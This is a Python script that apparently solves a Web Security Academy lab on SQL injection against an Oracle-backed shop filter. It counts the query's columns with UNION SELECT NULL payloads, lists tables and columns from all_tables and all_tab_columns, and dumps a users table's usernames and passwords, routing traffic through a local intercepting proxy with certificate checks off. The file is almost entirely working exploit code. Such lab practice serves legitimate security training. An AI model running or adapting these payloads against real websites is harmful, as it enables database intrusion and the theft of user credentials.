# listing oracle dbms
from typing import Union
from urllib.parse import quote, quote_plus

import requests as r
import urllib3
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session: r.Session = r.Session()
console: Console = Console()

session.verify = False
print = console.print

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "' UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "

        response: r.Response = session.get(
            URL + quote(PAYLOAD.strip(", ") + " FROM dual --")
        )

        if response.status_code == 200:
            break

        count += 1

    return count


def main() -> None:
    URL = "https://0a6000b50445b8518072127f00a1002e.web-security-academy.net/filter?category=Pets"

    # get tables with their schema names
    # PAYLOAD = (
    #     "' UNION SELECT "
    #     + ", ".join(
    #         (cols := ["table_name", "NULL"])
    #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
    #     ).strip(", ")
    #     + " FROM all_tables--"
    # )

    # get a particular table's columns names;
    # PAYLOAD = (
    #     "' UNION SELECT "
    #     + ", ".join(
    #         (cols := ["column_name", "NULL"])
    #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
    #     ).strip(", ")
    #     + " FROM all_tab_columns WHERE table_name = 'USERS_VLJZDV'--"
    # )

    # dump - USERS_VLJZDV
    PAYLOAD = (
        "' UNION SELECT "
        + ", ".join(
            (cols := ["USERNAME_INEZKH", "PASSWORD_IWBSSI"])
            + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
        ).strip(", ")
        + " FROM USERS_VLJZDV--"
    )

    response: r.Response = r.get(URL + PAYLOAD)
    print(response.text)
    print(response.status_code)


if __name__ == "__main__":
    main()
